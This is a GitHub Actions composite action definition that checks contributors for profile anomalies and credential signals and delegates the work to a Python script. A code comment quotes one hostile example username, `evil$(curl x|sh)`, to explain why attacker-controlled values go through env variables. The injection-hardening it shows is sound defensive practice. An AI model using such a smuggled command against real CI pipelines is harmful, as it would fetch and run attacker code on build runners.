name: "Contributor Check"
description: >
  Reusable composite action that screens GitHub contributors for
  account-shape anomalies, cross-repo patterns, and credential signals.
  Delegates to scripts/contributor_check_action.py for orchestration.

inputs:
  github-token:
    description: "GitHub token with issues:write and pull-requests:write"
    required: true
  checks:
    description: "Comma-separated list of checks to run: profile, credential, cluster"
    required: false
    default: "profile,credential"
  target-repo:
    description: "Repository for credential audit (owner/repo). Defaults to the current repo."
    required: false
    default: ""
  risk-threshold:
    description: "Minimum risk to comment/label: MEDIUM or HIGH"
    required: false
    default: "MEDIUM"

outputs:
  risk:
    description: "Overall risk level: LOW, MEDIUM, HIGH, or UNKNOWN"
    value: ${{ steps.run.outputs.risk }}
  profile-risk:
    description: "Profile analysis risk level"
    value: ${{ steps.run.outputs.profile-risk }}
  credential-risk:
    description: "Credential audit risk level"
    value: ${{ steps.run.outputs.credential-risk }}
  cluster-risk:
    description: "Cluster detection risk level (empty if not run)"
    value: ${{ steps.run.outputs.cluster-risk }}

runs:
  using: "composite"
  steps:
    - name: Setup Python
      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
      with:
        python-version: "3.12"

    - name: Resolve inputs
      id: inputs
      shell: bash
      env:
        # Pass GitHub context values through the env block rather than
        # ${{ }} expression interpolation inside the shell. A username
        # like `evil$(curl x|sh)` is attacker-controllable on a PR;
        # without this, the shell would expand it. With it, the value
        # arrives as a literal bash variable.
        EVENT_NAME: ${{ github.event_name }}
        PR_USER_LOGIN: ${{ github.event.pull_request.user.login }}
        PR_NUMBER: ${{ github.event.pull_request.number }}
        ISSUE_USER_LOGIN: ${{ github.event.issue.user.login }}
        ISSUE_NUMBER: ${{ github.event.issue.number }}
        DISPATCH_USERNAME: ${{ github.event.inputs.username || '' }}
        INPUT_TARGET_REPO: ${{ inputs.target-repo }}
        REPOSITORY: ${{ github.repository }}
      run: |
        username=""
        number="0"
        type="manual"

        if [ "$EVENT_NAME" = "pull_request_target" ] || [ "$EVENT_NAME" = "pull_request" ]; then
          username="$PR_USER_LOGIN"
          number="$PR_NUMBER"
          type="pr"
        elif [ "$EVENT_NAME" = "issues" ]; then
          username="$ISSUE_USER_LOGIN"
          number="$ISSUE_NUMBER"
          type="issue"
        elif [ "$EVENT_NAME" = "workflow_dispatch" ]; then
          username="$DISPATCH_USERNAME"
          type="manual"
        fi

        echo "username=$username" >> "$GITHUB_OUTPUT"
        echo "number=$number" >> "$GITHUB_OUTPUT"
        echo "type=$type" >> "$GITHUB_OUTPUT"

        target="$INPUT_TARGET_REPO"
        if [ -z "$target" ]; then
          target="$REPOSITORY"
        fi
        echo "target_repo=$target" >> "$GITHUB_OUTPUT"

    - name: Run contributor check
      id: run
      shell: bash
      env:
        GITHUB_TOKEN: ${{ inputs.github-token }}
        ACTION_PATH: ${{ github.action_path }}
        # Step outputs that include an attacker-influenced username
        # must also flow via env: into the shell.
        STEP_USERNAME: ${{ steps.inputs.outputs.username }}
        STEP_NUMBER: ${{ steps.inputs.outputs.number }}
        STEP_TYPE: ${{ steps.inputs.outputs.type }}
        STEP_TARGET_REPO: ${{ steps.inputs.outputs.target_repo }}
        INPUT_CHECKS: ${{ inputs.checks }}
        INPUT_RISK_THRESHOLD: ${{ inputs.risk-threshold }}
      run: |
        python "$ACTION_PATH/../../../scripts/contributor_check_action.py" \
          --username "$STEP_USERNAME" \
          --checks "$INPUT_CHECKS" \
          --target-repo "$STEP_TARGET_REPO" \
          --risk-threshold "$INPUT_RISK_THRESHOLD" \
          --number "$STEP_NUMBER" \
          --item-type "$STEP_TYPE"

    - name: Cleanup temporary files
      if: always()
      shell: bash
      run: |
        rm -f /tmp/agt-profile.json /tmp/agt-profile.log
        rm -f /tmp/agt-cred.json /tmp/agt-cred.log
        rm -f /tmp/agt-cluster.json /tmp/agt-cluster.log
